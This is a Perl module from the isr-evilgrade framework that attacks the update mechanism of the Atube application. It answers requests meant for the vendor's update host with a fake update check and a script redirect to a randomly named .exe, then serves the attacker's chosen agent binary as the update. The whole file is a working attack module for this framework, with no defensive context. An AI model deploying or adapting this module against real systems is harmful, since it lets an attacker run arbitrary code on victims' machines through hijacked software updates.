###############
# atube.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.infobytesec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::atube;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base=
{
    'name' => 'Atube',
    'version' => '1.0',
    'appver'  => '<1.0.300',
    'author' => [ 'German Rodriguez < grodriguez +[AT]+ infobytesec.com >' ],
    'description' => qq{},    
    'vh' => '(ytc.dsnetwb.com)',
    'request' => [
		    {
		    'req' => '/ytc_update.php\?item\=check', #regex friendly
		    'type' => 'file', #file|string|agent|install
		    'method' => '', #any
		    'bin'    => 0,
		    'string' => '',
		    'parse' => 1,
		    'file' => './include/atube/ytc.php',
		    },
                    {
		    'req' => '/ytc_update.php', #regex friendly
		    'type' => 'string', #file|string|agent|install
		    'method' => '', #any
		    'bin'    => 0,
		    'string' => '<html><script>window.location="http://ytc.dsnetwb.com/atube<%RND1%>.exe"</script></html>',
		    'parse' => 1,
		    'file' => '',
		    },
		   
		    {
		    'req' => '.exe', #regex friendly
		    'type' => 'agent', #file|string|agent|install
		    'method' => '', #any
		    'bin'    => 1,		    
		    'string' => '',
		    'parse' => 0,
		    'file' => ''
		    },
		    

    ],
    #Options		    
    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
		    'enable' => { 'val' => 1, 
			    	  'desc' => 'Status'},
                    'version'  => { 'val' => '\'7.\'.isrcore::utils::RndNum(2)',
                                  'hidden' => 1,
                                'dynamic' =>1,
				},
                    'rnd1'  => { 'val' => 'isrcore::utils::RndNum(5)',
                                  'hidden' => 1,
                                'dynamic' =>1,
                            }			    	  
		 }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}            
1;
